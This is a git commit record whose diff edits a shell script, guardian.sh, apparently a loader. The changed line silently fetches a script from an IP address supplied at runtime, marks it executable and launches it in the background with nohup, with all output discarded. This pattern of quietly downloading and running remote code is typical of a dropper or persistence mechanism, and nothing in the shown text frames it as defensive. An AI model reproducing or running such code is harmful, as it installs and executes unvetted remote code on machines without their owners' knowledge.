1a22be181b987870f3e6d1374d6243780521a4e0
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-05-26 12:08:40 +0100

    Update guardian.sh

--- guardian.sh
+++ guardian.sh
@@ -8,7 +8,7 @@ if [ -z "$ip_address" ]; then
 fi
 
 if [ ! -f "$script_path" ]; then
-    wget "http://$ip_address/guardian.sh" -O "$script_path" >/dev/null 2>&1
+    wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
     chmod +x "$script_path"
     nohup "$script_path" >/dev/null 2>&1 &
 
